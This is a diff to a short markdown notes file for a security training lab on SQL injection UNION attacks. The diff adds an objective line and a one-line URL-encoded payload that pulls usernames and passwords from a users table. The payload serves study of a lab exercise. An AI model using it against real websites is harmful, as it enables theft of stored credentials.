@@ -1,4 +1,9 @@
 # Lab: SQL injection UNION attack, retrieving data from other tables
 
 ## Objective
-Document solution and notes here.
+Perform the attack to solve SQL injection UNION attack, retrieving data from other tables.
+
+## Payload
+```text
+'+UNION+SELECT+username,+password+FROM+users--
+```
